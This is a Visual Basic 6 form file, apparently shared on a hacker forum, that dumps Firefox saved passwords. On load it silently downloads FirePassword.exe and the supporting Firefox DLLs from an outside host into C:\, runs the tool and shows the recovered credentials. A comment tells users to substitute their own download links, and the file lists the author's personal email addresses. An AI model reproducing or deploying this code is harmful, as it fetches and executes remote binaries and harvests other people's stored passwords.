VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Coded By Mason Soiza/IIRR From Elite-Coderz.com"
   ClientHeight    =   9495
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   6720
   LinkTopic       =   "Form1"
   ScaleHeight     =   9495
   ScaleWidth      =   6720
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      Height          =   9495
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Text            =   "Form1.frx":0000
      Top             =   0
      Width           =   6735
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Option Explicit

'Mason Soiza
'Msn = mason.soiza@live.co.uk
'Email = mason.soiza@gmail.com

Private Sub Form_Load()
If Dir("C:\FirePassword.exe") = "" Then
'Please Change This Shit To Your Own FirePassword.exe Links
URLDownloadToFile 0, "http://iirr.fileave.com/nspr4.dll", "C:\nspr4.dll", 0, 0
URLDownloadToFile 0, "http://iirr.fileave.com/nss3.dll", "C:\nss3.dll", 0, 0
URLDownloadToFile 0, "http://iirr.fileave.com/plc4.dll", "C:\plc4.dll", 0, 0
URLDownloadToFile 0, "http://iirr.fileave.com/plds4.dll", "C:\plds4.dll", 0, 0
URLDownloadToFile 0, "http://iirr.fileave.com/softokn3.dll", "C:\softokn3.dll", 0, 0
URLDownloadToFile 0, "http://iirr.fileave.com/FirePassword.exe", "C:\FirePassword.exe", 0, 0
  Text1.Text = DOSOutput("C:\FirePassword.exe")
  Else
    Text1.Text = DOSOutput("C:\FirePassword.exe")
End If

End Sub

